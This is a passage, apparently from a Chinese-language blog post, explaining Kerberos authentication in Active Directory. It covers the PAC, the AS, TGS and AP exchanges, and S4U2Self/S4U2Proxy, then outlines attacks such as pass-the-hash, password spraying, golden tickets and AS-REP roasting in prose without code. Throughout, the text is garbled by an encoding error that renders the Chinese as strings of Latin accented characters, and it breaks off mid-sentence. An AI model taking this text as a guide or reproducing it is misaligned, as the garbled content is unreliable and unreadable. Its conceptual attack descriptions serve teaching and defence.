è€Œæ˜¯ç›´æ¥åœ¨æœ¬åœ°è¿›è¡ŒPACä¿¡æ¯ä¸ACLçš„æ¯”è¾ƒï¼Œä»è€ŒèŠ‚çº¦äº†ç½‘ç»œèµ„æº\nå¯ä»¥ç»˜å›¾å¯¹æ¯”ä¸€ä¸‹ï¼š\næ— PACçš„æƒ…å†µï¼š æœ‰PACçš„æƒ…å†µï¼š\nç¼ºç‚¹\nPACåœ¨ç”¨æˆ·è®¤è¯é˜¶æ®µå¼•å…¥ä¼šå¯¼è‡´è®¤è¯æ—¶é—´è¿‡é•¿ï¼š Windows Kerberoså®¢æˆ·ç«¯ä¼šé€šè¿‡RPCè°ƒç”¨KDCä¸Šçš„å‡½æ•°æ¥éªŒè¯PACä¿¡æ¯ï¼Œè¿™æ—¶å€™ç”¨æˆ·ä¼šè§‚å¯Ÿåˆ°åœ¨æœåŠ¡å™¨ç«¯ä¸KDCä¹‹é—´çš„RPCåŒ…æµé‡çš„å¢åŠ  PACæ˜¯å¾®è½¯ç‰¹æœ‰çš„ä¸€ä¸ªç‰¹æ€§ï¼Œæ‰€ä»¥å¯ç”¨äº†PACçš„åŸŸä¸­å°†ä¸ä¾¿äºè£…æœ‰å…¶ä»–æ“ä½œç³»ç»Ÿçš„æœåŠ¡å™¨ï¼Œ åˆ¶çº¦äº†åŸŸé…ç½®çš„çµæ´»æ€§ å®‰å…¨é—®é¢˜ï¼š2014å¹´äº§ç”Ÿäº†ä¸€ä¸ªåŸŸå†…ææƒæ¼æ´ï¼ˆMS14-068ï¼‰ ä¸‰ã€Kerberosè®¤è¯æµç¨‹ å¯ä»¥ç»˜åˆ¶ä¸€å¼ å›¾æ¥æ¦‚æ‹¬Kerberosçš„è®¤è¯æµç¨‹ï¼š\næ¥ä¸‹æ¥åˆ†æå…·ä½“æµç¨‹\nAS-REQ\u0026amp;AS-REP ç»è¿‡æ­¤æ­¥ï¼Œå®¢æˆ·ç«¯è·å¾—äº†ç”±KDCçš„ASå‘æ”¾çš„TGT\n1.AS-REQ å½“åŸŸå†…æŸä¸ªç”¨æˆ·æƒ³è¦è®¿é—®åŸŸå†…æŸä¸ªæœåŠ¡æ—¶ï¼Œè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œæœ¬æœºå°±ä¼šå‘KDCçš„ASè®¤è¯æœåŠ¡å‘é€ä¸€ä¸ªAS-REQè®¤è¯è¯·æ±‚ã€‚\nè¯·æ±‚åŒ…ä¸­éƒ¨åˆ†å­—æ®µå«ä¹‰å¦‚ä¸‹ï¼š\nPA-DATA PA-ENC-TIMESTAMPï¼šè¿™ä¸ªæ˜¯é¢„è®¤è¯ï¼Œå°±æ˜¯ç”¨ç”¨æˆ·å¯†é’¥ï¼ˆé€šå¸¸ä¸ºNTLM hashæˆ–AES Keyï¼‰åŠ å¯†æ—¶é—´æˆ³ï¼Œä½œä¸ºvalueå‘é€ç»™KDCçš„ASæœåŠ¡ã€‚ç„¶åKDCä»æ´»åŠ¨ç›®å½•ä¸­æŸ¥è¯¢å‡ºç”¨æˆ·çš„å¯†é’¥å¯¹å…¶è¿›è¡Œè§£å¯†ï¼Œå³å¯è·å¾—æ—¶é—´æˆ³ï¼Œå¦‚æœèƒ½è§£å¯†ï¼Œä¸”æ—¶é—´æˆ³åœ¨ä¸€å®šçš„èŒƒå›´å†…ï¼Œåˆ™è¯æ˜è®¤è¯é€šè¿‡ã€‚å› ä¸ºè¿™é‡Œæ˜¯ä½¿ç”¨ç”¨æˆ·å¯†é’¥åŠ å¯†çš„æ—¶é—´æˆ³ï¼Œæ‰€ä»¥æœ‰å¯èƒ½é€ æˆå“ˆå¸Œä¼ é€’æ”»å‡»æˆ–å¯†é’¥ä¼ é€’æ”»å‡»\næ³¨æ„ï¼šåœ¨AS-REQè¯·æ±‚åŒ…ä¸­ï¼Œåªæœ‰è¯¥éƒ¨åˆ†æ˜¯åŠ å¯†çš„ï¼Œè¿™ä¸€éƒ¨åˆ†å±äºé¢„è®¤è¯ï¼Œè¢«ç§°ä¸ºAuthenticatorï¼Œè€Œç”¨æˆ·å¯†é’¥çš„ç±»å‹æ”¯æŒå¤šç§ï¼Œå®¢æˆ·ç«¯æ”¯æŒçš„åŠ å¯†æ–¹å¼æ˜¯ç”±æä¾›çš„å‡­æ®ç±»å‹å†³å®šçš„ï¼Œå¯¹åº”å¦‚ä¸‹ï¼ˆå·¦è¾¹ä¸ºç”¨æˆ·å¯†é’¥ç±»å‹ï¼Œå³è¾¹ä¸ºå¯†é’¥åŠ å¯†æ—¶é—´æˆ³çš„æ–¹å¼ï¼‰ï¼Œä¼˜å…ˆçº§ä»åˆ°ä¸‹é€æ¸é™ä½ï¼ˆåœ¨åé¢çš„è®¤è¯è¿‡ç¨‹ä¸­ï¼Œkrbtgtå’ŒæœåŠ¡çš„å¯†é’¥çš„ç±»å‹åŒç†ï¼‰ï¼š\nPA-DATA PA-PAC-REQUESTï¼šè¿™ä¸ªæ˜¯å¯ç”¨PACæ”¯æŒçš„æ‰©å±•ã€‚å­—æ®µä¸­æœ‰ä¸€ä¸ªpadata-valueå­—æ®µï¼Œå…¶ä¸­include-pacå¯¹åº”çš„å€¼ä¸ºTrueæˆ–False,KDCæ ¹æ®includeçš„å€¼æ¥ç¡®å®šè¿”å›çš„ç¥¨æ®ä¸­æ˜¯å¦éœ€è¦æºå¸¦PAC\nkdc-optionsï¼šç”¨äºä¸KDCåå•†ä¸€äº›é€‰é¡¹è®¾ç½®\ncnameï¼šè¯·æ±‚çš„ç”¨æˆ·åï¼Œç”¨æˆ·åæ˜¯å¦å­˜åœ¨ä¼šå½±å“è¿”å›åŒ…çš„å†…å®¹ï¼Œå› æ­¤å¯ä»¥è¿›è¡ŒåŸŸå†…ç”¨æˆ·åæšä¸¾ï¼›è€Œç”¨æˆ·åå­˜åœ¨æ—¶ï¼Œå¯†ç çš„æ­£ç¡®ä¸å¦ä¹Ÿä¼šå½±å“è¿”å›åŒ…ï¼Œå› æ­¤å¯ä»¥è¿›è¡Œå¯†ç å–·æ´’ï¼ˆpassword sprayingï¼‰\nrealmï¼šåŸŸå\nsnameï¼šè¯·æ±‚çš„æœåŠ¡åï¼ŒåŒ…å«typeå’Œvalueï¼ŒAS-REQä¸­snameå§‹ç»ˆä¸ºkrbtgtï¼Œå³è¿™ä¸ªé˜¶æ®µè¯·æ±‚çš„æœåŠ¡éƒ½æ˜¯krbtgt\netypeï¼šåŠ å¯†ç±»å‹\nä»¥åŠä¸€äº›å…¶ä»–ä¿¡æ¯ï¼šå¦‚ç‰ˆæœ¬å·ï¼Œæ¶ˆæ¯ç±»å‹ï¼Œç¥¨æ®æœ‰æ•ˆæ—¶é—´ï¼Œåå•†é€‰é¡¹ç­‰\n2.AS-REP å½“KDCçš„ASè®¤è¯æœåŠ¡æ¥æ”¶åˆ°å®¢æˆ·ç«¯å‘æ¥çš„AS-REQè¯·æ±‚åï¼Œä»æ´»åŠ¨ç›®å½•æ•°æ®åº“ä¸­å–å‡ºè¯¥ç”¨æˆ·çš„å¯†é’¥ï¼Œç„¶åç”¨è¯¥å¯†é’¥å¯¹è¯·æ±‚åŒ…ä¸­çš„Authenticatoré¢„è®¤è¯éƒ¨åˆ†è¿›è¡Œè§£å¯†ï¼Œå¦‚æœè§£å¯†æˆåŠŸï¼Œå¹¶ä¸”æ—¶é—´æˆ³åœ¨æœ‰æ•ˆçš„èŒƒå›´å†…ï¼Œåˆ™è¯æ˜è¯·æ±‚è€…æä¾›çš„ç”¨æˆ·å¯†é’¥æ­£ç¡®ï¼ˆéªŒè¯æ—¶é—´æˆ³ä»¥ç¡®ä¿kerberosä¸­çš„æ—¶é’ŸåŒæ­¥ï¼‰\nKDCçš„ASè®¤è¯æœåŠ¡åœ¨æˆåŠŸè®¤è¯å®¢æˆ·ç«¯çš„èº«ä»½ä¹‹åï¼Œå‘é€AS-REPå“åº”åŒ…ç»™å®¢æˆ·ç«¯ã€‚AS-REPå“åº”åŒ…ä¸­ä¸»è¦åŒ…æ‹¬å¦‚ä¸‹ä¿¡æ¯ï¼š\ncrealmï¼šåŸŸå\ncnameï¼šè¯·æ±‚çš„ç”¨æˆ·å\nticketï¼šè®¤è´­æƒè¯ç¥¨æ®ï¼ˆTGTï¼‰\nTGTè®¤è´­æƒè¯ä¸­åŒ…å«ä¸€äº›æ˜æ–‡æ˜¾ç¤ºçš„ä¿¡æ¯ï¼Œå¦‚ç‰ˆæœ¬å·tkt-vnoã€åŸŸårealmã€è¯·æ±‚çš„æœåŠ¡åsnameã€‚\nTGTä¸­æœ€é‡è¦çš„è¿˜æ˜¯enc-partå­—æ®µï¼ˆTGTä¸­çš„åŠ å¯†éƒ¨åˆ†ï¼‰ï¼Œæ˜¯ä½¿ç”¨krbtgtå¸æˆ·å¯†é’¥ï¼ˆä¸€èˆ¬ä¸ºNTLM-hashï¼‰åŠ å¯†çš„ã€‚åŠ å¯†éƒ¨åˆ†ä¸»è¦åŒ…å«çš„å†…å®¹æœ‰Logon Session Keyã€è¯·æ±‚çš„ç”¨æˆ·åcnameã€åŸŸåcrealmã€è®¤è¯æ—¶é—´authtimeã€è®¤è¯åˆ°æœŸæ—¶é—´endtimeã€authorization-dataç­‰ä¿¡æ¯ï¼Œæœ€é‡è¦çš„æ˜¯authorization-dataéƒ¨åˆ†ï¼Œè¯¥éƒ¨åˆ†ä¸­åŒ…å«PACï¼Œå®¢æˆ·ç«¯çš„èº«ä»½æƒé™ç­‰ä¿¡æ¯åŒ…å«åœ¨PACä¸­ï¼Œè€ŒPACä¸­æœ€ä¸»è¦çš„è¿˜æ˜¯é€šè¿‡User RIDå’ŒGroup RIDæ¥è¾¨åˆ«ç”¨æˆ·æƒé™çš„\n**KDCç”ŸæˆPACçš„è¿‡ç¨‹å¦‚ä¸‹ï¼š**KDCåœ¨æ”¶åˆ°å®¢æˆ·ç«¯å‘æ¥çš„AS-REQè¯·æ±‚åï¼Œä»è¯·æ±‚ä¸­å–å‡ºcnameå­—æ®µï¼Œç„¶åæŸ¥è¯¢æ´»åŠ¨ç›®å½•æ•°æ®åº“ï¼Œæ‰¾åˆ°sAMAccountNameå±æ€§ä¸ºcnameå­—æ®µçš„å€¼çš„ç”¨æˆ·ï¼Œç”¨è¯¥ç”¨æˆ·çš„èº«ä»½ç”Ÿæˆä¸€ä¸ªå¯¹åº”çš„PAC\nä¸Šé¢æåˆ°ï¼Œenc-partå­—æ®µéƒ¨åˆ†æ˜¯ç”¨krbtgtçš„å¯†é’¥åŠ å¯†çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è·å¾—äº†krbtgtçš„å¯†é’¥ï¼Œå°±å¯ä»¥è‡ªå·±åˆ¶ä½œä¸€ä¸ªticketï¼Œå³å¯é€ æˆé»„é‡‘ç¥¨æ®ä¼ é€’æ”»å‡»\nenc-partï¼šè¿™ä¸ªenc-partä¸ä¸Šé¢TGTä¸­çš„enc-partä¸åŒï¼Œæ˜¯AS-REPä¸­æœ€å¤–å±‚çš„ä½¿ç”¨ç”¨æˆ·å¯†é’¥åŠ å¯†Logon Session Keyåçš„å€¼ï¼Œå…¶ä½œç”¨æ˜¯ç”¨äºç¡®ä¿å®¢æˆ·ç«¯å’ŒKDCä¸‹é˜¶æ®µä¹‹é—´é€šä¿¡å®‰å…¨ï¼Œä¸»è¦åŒ…å«äº†è®¤è¯æ—¶é—´authtimeã€è®¤è¯åˆ°æœŸæ—¶é—´endtimeã€åŸŸåsrealmã€è¯·æ±‚çš„æœåŠ¡åsnameã€åå•†æ ‡å¿—flagsç­‰ä¿¡æ¯\næ³¨ï¼šåœ¨TGTå†…éƒ¨å’Œå¤–éƒ¨çš„enc-partä¸­éƒ½å­˜åœ¨Logon Session Key\nä»¥åŠä¸€äº›å…¶ä»–ä¿¡æ¯ï¼šå¦‚ç‰ˆæœ¬å·ï¼Œæ¶ˆæ¯ç±»å‹ç­‰\nTGS-REQ\u0026amp;TGS-REP å®¢æˆ·ç«¯åœ¨æ”¶åˆ°KDCçš„AS-REPåï¼Œä½¿ç”¨ç”¨æˆ·å¯†é’¥è§£å¯†enc_Logon Session Keyï¼ˆå¤–éƒ¨çš„enc-partï¼‰ï¼Œå¾—åˆ°Logon Session Keyï¼Œå¹¶ä¸”ä¹Ÿè·å¾—äº†TGTã€‚ä¹‹åå®¢æˆ·ç«¯ä¼šåœ¨æœ¬åœ°ç¼“å­˜æ­¤TGTå’ŒLogon Session Keyã€‚æ¥ä¸‹æ¥å®¢æˆ·ç«¯è¦å‡­å€Ÿè¯¥TGTå‘KDCè´­ä¹°ç›¸åº”çš„STï¼ŒSTæ˜¯KDCçš„TGSæœåŠ¡å‘æ”¾çš„ã€‚è¯¥é˜¶æ®µä¸­ï¼Œå¾®è½¯å¼•å…¥äº†ä¸¤ä¸ªæ‰©å±•è‡ªåè®®S4u2Selfå’ŒS4u2Proxyï¼ˆåœ¨åé¢å§”æ´¾éƒ¨åˆ†ä»‹ç»ï¼‰\n3.TGS-REQ å®¢æˆ·ç«¯ç”¨ä¸Šä¸€æ­¥è·å¾—çš„TGTå‘èµ·TGS-REQï¼Œå‘KDCè´­ä¹°é’ˆå¯¹æŒ‡å®šæœåŠ¡çš„ST\nTGS-REQä¸­é‡è¦å­—æ®µå¦‚ä¸‹ï¼š\npadataï¼špadataä¸­åŒ…å«ap_req,è¿™ä¸ªæ˜¯TGS_REQå¿…é¡»æºå¸¦çš„éƒ¨åˆ† ap-reqï¼šå­˜åœ¨äºpadataï¼Œè¿™éƒ¨åˆ†ä¼šæºå¸¦AS_REPé‡Œé¢è·å–åˆ°çš„TGTè®¤è´­æƒè¯å’Œä½¿ç”¨åŸå§‹çš„Logon Session KeyåŠ å¯†çš„æ—¶é—´æˆ³ ticketï¼šå­˜åœ¨äºap-reqä¸­ï¼ŒAS-REPå“åº”åŒ…ä¸­è¿”å›çš„TGTè®¤è´­æƒè¯ authenticator: å­˜åœ¨äºap-reqä¸­ï¼ŒåŸå§‹Logon Session KeyåŠ å¯†çš„æ—¶é—´æˆ³ï¼Œç”¨äºä¸‹ä¸€é˜¶æ®µçš„ä¼šè¯å®‰å…¨è®¤è¯ã€‚ä¸ºäº†ç¡®ä¿åé˜¶æ®µçš„ä¼šè¯å®‰å…¨ï¼ŒTGS-REQä¸­ap-reqä¸­çš„authenticatorå­—æ®µçš„å€¼æ˜¯ç”¨ä¸Šä¸€æ­¥AS-REPä¸­è¿”å›çš„Logon Session KeyåŠ å¯†çš„æ—¶é—´æˆ³ 4.TGS-REP KDCçš„TGSæœåŠ¡åœ¨æ¥æ”¶åˆ°TGS-REQåä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š\nä½¿ç”¨krbtgtçš„å¯†é’¥è§£å¯†TGTä¸­çš„åŠ å¯†éƒ¨åˆ†ï¼Œå¾—åˆ°Logon Session Keyå’ŒPACç­‰ä¿¡æ¯ï¼Œè§£å¯†æˆåŠŸåˆ™è¯´æ˜è¯¥TGTæ˜¯KDCé¢å‘çš„\néªŒè¯PACçš„ç­¾åï¼Œç­¾åæ­£ç¡®åˆ™è¯æ˜PACæœªè¢«ç¯¡æ”¹\nä½¿ç”¨Logon Session Keyè§£å¯†authenticatorå¾—åˆ°æ—¶é—´æˆ³ç­‰ä¿¡æ¯ï¼Œè‹¥è§£å¯†æˆåŠŸï¼Œä¸”ç¥¨æ®æ—¶é—´åœ¨æœ‰æ•ˆèŒƒå›´å†…ï¼Œåˆ™è¯æ˜è¯¥ä¼šè¯å®‰å…¨\nç»è¿‡ä¸Šè¿°æ­¥éª¤ï¼ŒKDCçš„TGSå°±å®Œæˆäº†å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ï¼ŒTGSä¾¿å‘é€REPç»™å®¢æˆ·ç«¯\næ³¨ï¼šå‘é€TGS-REPå‰KDCå¹¶ä¸ä¼šéªŒè¯å®¢æˆ·ç«¯æ˜¯å¦æœ‰æƒé™è®¿é—®æœåŠ¡ç«¯ã€‚ä¸ç®¡ç”¨æˆ·æ˜¯å¦æœ‰è®¿é—®æœåŠ¡çš„æƒé™ï¼Œåªè¦TGTæ­£ç¡®ï¼Œå‡ä¼šè¿”å›ST\nåœ¨TGS-REPä¸­ï¼Œéƒ¨åˆ†å­—æ®µå¦‚ä¸‹ï¼š\nticketï¼šå³STï¼ŒSTä¸­åŒ…å«æ˜æ–‡æ˜¾ç¤ºçš„ä¿¡æ¯æ¯”å¦‚ï¼šç‰ˆæœ¬å·tkt-vnoã€åŸŸårealmã€è¯·æ±‚çš„æœåŠ¡åsname\u0026hellip;\u0026hellip;åŠ å¯†éƒ¨åˆ†æ˜¯ä½¿ç”¨æœåŠ¡å¯†é’¥åŠ å¯†çš„ï¼Œä¸»è¦åŒ…å«Server Session Keyã€è¯·æ±‚çš„ç”¨æˆ·åcnameã€åŸŸåcrealmã€è®¤è¯æ—¶é—´authtimeã€è®¤è¯åˆ°æœŸæ—¶é—´endtimeã€authorization-dataç­‰ä¿¡æ¯ï¼Œè€Œauthorization-dataéƒ¨åˆ†ä¸­åŒ…å«PACï¼Œå®¢æˆ·ç«¯çš„èº«ä»½æƒé™ç­‰ä¿¡æ¯åŒ…å«åœ¨PACä¸­\næ³¨ï¼šåœ¨æ­£å¸¸çš„éS4u2Selfè¯·æ±‚çš„TGSè¿‡ç¨‹ä¸­ï¼ŒKDCåœ¨STä¸­çš„PACç›´æ¥å¤åˆ¶äº†TGTä¸­çš„PAC\nenc-partï¼ˆticketä¸­çš„ï¼‰ï¼šè¿™éƒ¨åˆ†æ˜¯ä½¿ç”¨æœåŠ¡çš„å¯†é’¥åŠ å¯†çš„\nenc-partï¼ˆæœ€å¤–å±‚çš„ï¼‰ï¼šè¿™éƒ¨åˆ†æ˜¯ä½¿ç”¨åŸå§‹çš„Logon Session KeyåŠ å¯†çš„ã€‚é‡Œé¢æœ€é‡è¦çš„å­—æ®µæ˜¯Service Session Keyï¼ˆå’ŒSTä¸­çš„server session keyä¸€æ ·ï¼‰ï¼ŒåŒ…å«è¯·æ±‚çš„ç”¨æˆ·åsnameã€åŸŸåsrealmã€è®¤è¯æ—¶é—´authtimeã€è®¤è¯åˆ°æœŸæ—¶é—´endtimeã€åå•†æ ‡å¿—flagsç­‰ä¿¡æ¯ï¼Œä½œä¸ºä¸‹ä¸€é˜¶æ®µçš„è®¤è¯å¯†é’¥\nAP-REQ\u0026amp;AP-REPåŒå‘è®¤è¯ å®¢æˆ·ç«¯æ”¶åˆ°KDCè¿”å›çš„TGS-REPæ¶ˆæ¯åï¼Œä»ä¸­å–å‡ºSTï¼Œå‡†å¤‡å¼€å§‹ç”³è¯·è®¿é—®æœåŠ¡\n5.AP-REQ å®¢æˆ·ç«¯åœ¨æ¥æ”¶åˆ°KDCçš„TGSå›å¤åï¼Œé€šè¿‡ç¼“å­˜çš„Logon Session Keyè§£å¯†TGS-REPçš„å¤–å±‚enc-partå¾—åˆ°service session keyï¼ŒåŒæ—¶ä¹Ÿè·å¾—äº†STã€‚service session keyå’ŒSTä¼šè¢«å®¢æˆ·ç«¯ç¼“å­˜ã€‚\nå®¢æˆ·ç«¯è®¿é—®æŒ‡å®šæœåŠ¡æ—¶ï¼Œå°†å‘èµ·AP-REQï¼Œå…¶ä¸­éƒ¨åˆ†å­—æ®µå¦‚ä¸‹ï¼š\nticketï¼šç¥¨æ®ï¼ˆSTï¼‰ authenticatorï¼šService Session KeyåŠ å¯†çš„æ—¶é—´æˆ³ 6.AP-REP æœåŠ¡ç«¯åœ¨æ”¶åˆ°å®¢æˆ·ç«¯å‘æ¥çš„AP-REQåï¼Œé€šè¿‡æœåŠ¡å¯†é’¥è§£å¯†STï¼Œå¾—åˆ°Service Session Keyå’ŒPACç­‰ä¿¡æ¯ï¼Œå†ç”¨Service Session Keyè§£å¯†authenticatorå¾—åˆ°æ—¶é—´æˆ³ï¼Œå¦‚æœè§£å¯†æˆåŠŸï¼Œä¸”æ—¶é—´æˆ³åœ¨æœ‰æ•ˆèŒƒå›´å†…ï¼Œåˆ™æˆåŠŸéªŒè¯å®¢æˆ·ç«¯èº«ä»½\nåœ¨é»˜è®¤ä¸å¼€å¯KDCéªŒè¯PACçš„æƒ…å†µä¸‹ï¼ŒéªŒè¯å®¢æˆ·ç«¯èº«ä»½åï¼ŒæœåŠ¡ç«¯å°†ä»PACä¸­å–å‡ºä»£è¡¨ç”¨æˆ·èº«ä»½æƒé™ä¿¡æ¯çš„æ•°æ®ï¼Œç›´æ¥ä¸è¯·æ±‚çš„æœåŠ¡ACLåšå¯¹æ¯”ï¼Œå¹¶ä¸”æ ¡éªŒPAC_SERVER_CHECKSUMç­¾åï¼ŒæˆåŠŸåç”Ÿæˆç›¸åº”çš„è®¿é—®ä»¤ç‰Œï¼ŒæœåŠ¡ç«¯æ ¹æ®è®¿é—®ä»¤ç‰Œçš„æƒé™å†³å®šæ˜¯å¦å¼€å¯ç›¸åº”çš„æœåŠ¡\nåœ¨å¼€å¯KDCéªŒè¯PACçš„æƒ…å†µä¸‹ï¼Œåœ¨åŸæœ¬æ ¡éªŒåŸºç¡€ä¸Šï¼Œå®¢æˆ·ç«¯è¿˜ä¼šå°†PAC_PRIVSVR_CHECKSUMç­¾åä»¥KRB_VERIFY_PACçš„æ¶ˆæ¯é€šè¿‡RPCåè®®å‘é€ç»™KDCï¼ŒKDCå†å°†è¯¥PACæ•°å­—ç­¾åçš„ç»“æœä»¥RPCè¿”å›ç çš„å½¢å¼å‘é€ç»™æœåŠ¡ç«¯ï¼Œä»¥æ­¤åˆ¤æ–­PACçš„çœŸå®æ€§å’Œæœ‰æ•ˆæ€§ï¼Œç„¶åè¿”å›æ ¡éªŒç»“æœï¼ŒæœåŠ¡ç«¯æ ¹æ®æ ¡éªŒç»“æœå†³å®šæ˜¯å¦å¼€å¯ç›¸åº”çš„æœåŠ¡\næ¥ä¸‹æ¥ï¼ŒæœåŠ¡ç«¯æ ¹æ®AP-REQä¸­çš„mutual-requiredé€‰é¡¹å†³å®šæœåŠ¡ç«¯æ˜¯å¦è¿”å›AP-REP:\nmutual-requiredé€‰é¡¹ä¸ºtureæ—¶ï¼Œè¡¨æ˜å®¢æˆ·ç«¯æƒ³è¦éªŒè¯æœåŠ¡ç«¯çš„èº«ä»½ï¼ŒæœåŠ¡ç«¯ä¼šç”¨Service Session KeyåŠ å¯†æ—¶é—´æˆ³ä½œä¸ºauthenticatorï¼Œåœ¨AP-REPä¸­å‘é€ç»™å®¢æˆ·ç«¯è¿›è¡ŒéªŒè¯ï¼Œå®¢æˆ·ç«¯åœ¨éªŒè¯æœåŠ¡ç«¯èº«ä»½åå†³å®šæ˜¯å¦è®¿é—®è¯¥æœåŠ¡ mutual-requiredé€‰é¡¹ä¸ºfalseæ—¶ï¼Œåˆ™ä¸è¿”å›AP-REP S4u2Self\u0026amp;S4u2Proxyåè®® ä¸ºäº†åœ¨kerberosåè®®å±‚é¢ç›´æ¥å¯¹çº¦æŸæ€§å§”æ´¾è¿›è¡Œæ”¯æŒï¼Œå¾®è½¯å¯¹kerberosåè®®æ‰©å±•äº†ä¸¤ä¸ªè‡ªåè®®ï¼šS4u2Selfï¼ˆService for User to Selfï¼‰å’ŒS4u2Proxyï¼ˆService for User to Proxyï¼‰\nS4u2Selfå¯ä»¥ä»£è¡¨ä»»æ„ç”¨æˆ·è¯·æ±‚é’ˆå¯¹è‡ªèº«çš„æœåŠ¡ç¥¨æ® S4u2Proxyå¯ä»¥ç”¨ä¸Šä¸€æ­¥è·å¾—çš„STï¼Œä»¥ç”¨æˆ·çš„åä¹‰æƒ…æ±‚é’ˆå¯¹å…¶ä»–æŒ‡å®šæœåŠ¡çš„ST S4u2Self å’Œæ­£å¸¸çš„TGS-REQåŒ…ç›¸æ¯”ï¼ŒS4u2Selfåè®®çš„TGS-REQåŒ…ä¸­ï¼ŒPA-DATAéƒ¨åˆ†ä¼šå¤šä¸€ä¸ª pA-FOR-USERå­—æ®µï¼Œæ•°æ®ç±»å‹æ˜¯S4U2Selfï¼Œè¯¥å­—æ®µåŒ…å«çš„å­—æ®µï¼š\nnameï¼šè¦æ¨¡æ‹Ÿçš„ç”¨æˆ· snameï¼šè¯·æ±‚çš„æœåŠ¡è‡ªèº« S4u2Proxy å’Œæ­£å¸¸çš„TGS-REQåŒ…ç›¸æ¯”ï¼ŒS4u2Proxyåè®®çš„TGS-REQåŒ…ä¸­ï¼ŒPA-DATAéƒ¨åˆ†ä¼šå¤šä¸€ä¸ªPA_PAC_OPTIONSï¼Œæ•°æ®ç±»å‹æ˜¯S4U2Proxyï¼›è¿˜ä¼šå¢åŠ ä¸€ä¸ªadditional-ticketså­—æ®µï¼Œè¯¥å­—æ®µçš„å†…å®¹å°±æ˜¯ä¸Šä¸€æ­¥åˆ©ç”¨S4u2Selfè¯·æ±‚çš„ST\nå››ã€Kerberosåè®®çš„å®‰å…¨é—®é¢˜ Kerberosåè®®å„é˜¶æ®µå®¹æ˜“äº§ç”Ÿçš„å®‰å…¨é—®é¢˜ï¼Œå¯ä»¥ç»˜åˆ¶ä¸€å¹…å›¾æ¥æ€»ç»“ï¼š\næ­¤å¤„åªå¯¹AS-REQ\u0026amp;AS-REPé˜¶æ®µå’ŒTGS-REPé˜¶æ®µçš„é—®é¢˜ç¨ä½œä»‹ç»ï¼Œåé¢ä¼šå¦å‘æ–‡ç« è¯¦ç»†è®°å½•Kerberosç›¸å…³å®‰å…¨é—®é¢˜\nAS-REQé˜¶æ®µçš„å®‰å…¨é—®é¢˜ 1.å“ˆå¸Œä¼ é€’æ”»å‡» ä¸Šé¢æåˆ°ï¼Œåœ¨AS-REQé˜¶æ®µï¼Œä½¿ç”¨çš„æ˜¯ç”¨æˆ·å¯†ç çš„NTLM hashæˆ–AES Keyæ¥åŠ å¯†çš„æ—¶é—´æˆ³ï¼Œæ‰€ä»¥å¯ä»¥è·å–NTLM hashé€ æˆPTHæ”»å‡»ï¼Œä¹Ÿå¯èƒ½è·å–AES Keyé€ æˆPTKæ”»å‡»\n2.åŸŸç”¨æˆ·åæšä¸¾ AS-REQä¸­çš„cnameè¡¨ç¤ºè¯·æ±‚çš„ç”¨æˆ·åï¼Œç”¨æˆ·åæ˜¯å¦å­˜åœ¨ä¼šå½±å“è¿”å›åŒ…çš„å†…å®¹ï¼Œå› æ­¤å¯ä»¥è¿›è¡ŒåŸŸå†…ç”¨æˆ·åæšä¸¾ï¼ˆå½“æœªè·å–åˆ°æœ‰æ•ˆåŸŸç”¨æˆ·æƒé™æ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•æšä¸¾åŸŸå†…ç”¨æˆ·ï¼‰\n3.å¯†ç å–·æ´’æ”»å‡» è€Œç”¨æˆ·åå­˜åœ¨æ—¶ï¼Œå¯†ç çš„æ­£ç¡®ä¸å¦ä¹Ÿä¼šå½±å“è¿”å›åŒ…ï¼Œè¿™é‡Œè™½ç„¶å¯ä»¥è¿›è¡Œå¯†ç çˆ†ç ´ï¼Œä½†è¿ç»­é’ˆå¯¹åŒä¸€è´¦æˆ·çš„å¯†ç çŒœæµ‹å¾ˆæœ‰å¯èƒ½ä¼šå¯¼è‡´è´¦æˆ·è¢«é”å®šï¼Œå› æ­¤æœ‰äº†å¯†ç å–·æ´’å–·æ´’æ”»å‡»ï¼šå³åœ¨çŒœè§£å¯†ç æ—¶ï¼Œä½¿ç”¨æ¯ä¸ªå¯†ç å»å°è¯•æ‰€æœ‰ç”¨æˆ·å\nAS-REPé˜¶æ®µçš„å®‰å…¨é—®é¢˜ 1.é»„é‡‘ç¥¨æ®æ”»å‡» ä¸Šæ–‡æåˆ°ï¼Œåœ¨AS-REPé˜¶æ®µï¼Œè¿”å›çš„TGTçš„åŠ å¯†éƒ¨åˆ†æ˜¯ç”±krbtgtç”¨æˆ·çš„å¯†é’¥åŠ å¯†çš„ï¼Œå› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬è·å¾—äº†krbtgtçš„å¯†é’¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥è‡ªå·±åˆ¶ä½œä¸€ä¸ªTGTï¼Œè¯¥ç¥¨æ®è¢«ç§°ä¸ºé»„é‡‘ç¥¨æ®\n2.AS-REP Roasting é¢„èº«ä»½éªŒè¯æ˜¯Kerberosèº«ä»½éªŒè¯çš„ç¬¬ä¸€æ­¥(AS_REQ \u0026amp; AS_REP)ï¼Œå®ƒçš„ä¸»è¦ä½œç”¨æ˜¯é˜²æ­¢å¯†ç è„±æœºçˆ†ç ´ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œé¢„èº«ä»½éªŒè¯æ˜¯å¼€å¯çš„ï¼ŒKDCä¼šè®°å½•å¯†ç é”™è¯¯æ¬¡æ•°ï¼Œé˜²æ­¢åœ¨çº¿çˆ†ç ´\nä¸Šæ–‡æåˆ°ï¼Œåœ¨AS-REPé˜¶æ®µï¼ŒLogon Session Keyæ˜¯ç”¨ç”¨æˆ·çš„å¯†é’¥åŠ å¯†çš„ã€‚å¯¹äºåŸŸç”¨æˆ·ï¼Œå¦‚æœè®¾ç½®äº†â€œDo not require Kerberos preauthenticationâ€ï¼ˆä¸éœ€è¦é¢„è®¤è¯ï¼‰é€‰é¡¹ï¼Œæ”»å‡»è€…å¯ä»¥å‘åŸŸæ§çš„88ç«¯å£å‘é€AS_REQï¼Œæ­¤æ—¶åŸŸæ§ä¸ä¼šåšä»»ä½•éªŒè¯å°±å°†TGTå’Œä½¿ç”¨è¯¥ç”¨æˆ·å¯†é’¥åŠ å¯†çš„Logon Session Keyè¿”å›ã€‚å¦‚æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥å¯¹è·å–åˆ°çš„åŠ 